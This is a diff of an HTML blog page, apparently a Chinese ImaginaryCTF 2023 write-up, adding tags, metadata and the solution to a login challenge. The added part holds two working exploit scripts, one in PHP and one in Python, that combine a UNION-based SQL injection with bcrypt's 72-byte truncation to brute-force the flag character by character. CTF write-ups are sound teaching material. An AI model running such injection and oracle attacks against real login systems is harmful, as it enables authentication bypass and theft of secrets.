@@ -40,9 +40,12 @@
 <meta property="og:image" content="http://example.com/2023/07/23/imaginary-ctf/image-20230724015219040.png">
 <meta property="og:image" content="http://example.com/2023/07/23/imaginary-ctf/image-20230724015352137.png">
 <meta property="og:image" content="http://example.com/2023/07/23/imaginary-ctf/image-20230724020238024.png">
+<meta property="og:image" content="http://example.com/2023/07/23/imaginary-ctf/image-20230724022049089.png">
 <meta property="article:published_time" content="2023-07-23T09:23:12.000Z">
-<meta property="article:modified_time" content="2023-07-23T18:06:06.734Z">
+<meta property="article:modified_time" content="2023-07-23T18:21:55.456Z">
 <meta property="article:author" content="Potat0w0">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Misc">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/2023/07/23/imaginary-ctf/image-20230723215418709.png">
   
@@ -256,7 +259,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          10k words
+          12k words
         
       </span>
     
@@ -267,7 +270,7 @@
         
         
         
-          85 mins
+          101 mins
         
       </span>
     
@@ -414,7 +417,15 @@
 <p>使用PASSWORD_BCRYPY算法加密，被加密字符串最多长72个字节，这是官方给出的描述</p>
 <p><img src="/2023/07/23/imaginary-ctf/image-20230724020238024.png" srcset="/img/loading.gif" lazyload></p>
 <p>当时我没去自己查相关特性，求助了L1ao学长，他给了个<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#password_hash-password_verify"><strong>trick</strong></a>，这个trick讲的其实更加直白，很容易看懂意图所在，但是真的从刚开始就把<code>.=</code>看成 <code>=</code>了呜呜呜呜呜，</p>
+<p>最开始的时候不知道为啥闲着没事就用php而不是python写了一个脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0&#x27;</span>;<br><span class="hljs-variable">$pre</span> = <span class="hljs-string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?&#123;&#125;_&quot;</span>;<br><span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$pre</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$re</span> = <span class="hljs-number">71</span>;<span class="hljs-variable">$re</span> &gt; <span class="hljs-number">0</span>;<span class="hljs-variable">$re</span>--)&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$i</span>)&#123;<br>        <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$re</span>);<br>        <span class="hljs-variable">$password</span> =  <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$re</span>).<span class="hljs-variable">$flag</span>.<span class="hljs-variable">$i</span>, PASSWORD_BCRYPT);<br>        <span class="hljs-variable">$post</span> = <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-variable">$username</span>,<br>            <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;\&#x27; union select \&#x27;admin\&#x27;,\&#x27;&#x27;</span>.<span class="hljs-variable">$password</span>.<span class="hljs-string">&#x27;\&#x27;--&#x27;</span><br>        );<br>        <span class="hljs-comment">#echo $post[&#x27;username&#x27;];</span><br>        <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">http_build_query</span>(<span class="hljs-variable">$post</span>);<br>        <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>); <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_POST, <span class="hljs-number">1</span>); <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_POSTFIELDS, <span class="hljs-variable">$post</span>); <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>); <br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$res</span>,<span class="hljs-string">&#x27;Welcome&#x27;</span>))&#123;<br>            <span class="hljs-variable">$flag</span> .= <span class="hljs-variable">$i</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">#echo $res;</span><br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
+<p>有点小慢，问chatgpt知道python里是有一个bcrypy库的，于是再写了个python脚本，写完之后发现其实速度大差不差</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> bcrypt<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>pre = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?1234567890&#125;&#123;_&quot;</span><br><span class="hljs-keyword">for</span> re <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">71</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pre:<br>        <span class="hljs-comment">#print(flag)</span><br>        password = <span class="hljs-string">&quot;a&quot;</span> * re<br>        username = <span class="hljs-string">&quot;a&quot;</span> * re + flag + i<br><br>        hashed_password = bcrypt.hashpw(username.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), bcrypt.gensalt())<br>        post_data = &#123;<br>            <span class="hljs-string">&#x27;password&#x27;</span>: password,<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;\&#x27; union select \&#x27;admin\&#x27;,\&#x27;&#x27;</span> + hashed_password.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) + <span class="hljs-string">&#x27;\&#x27;--&#x27;</span><br>        &#125;<br>        <span class="hljs-comment">#print(&quot;username:&quot;+username+&quot;\n&quot;)</span><br>        <span class="hljs-comment">#print(post_data)</span><br>        url = <span class="hljs-string">&#x27;http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0&#x27;</span><br><br>        response = requests.post(url, data=post_data)<br>        res = response.text<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Welcome&#x27;</span> <span class="hljs-keyword">in</span> res:<br>            flag += i<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+
+<p>超酷的好吗</p>
+<p><img src="/2023/07/23/imaginary-ctf/image-20230724022049089.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2>
                 
               </div>
             
@@ -422,6 +433,15 @@
             <div>
               <div class="post-metas my-3">
   
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+        <a href="/tags/Misc/">#Misc</a>
+      
+    </div>
   
 </div>
 
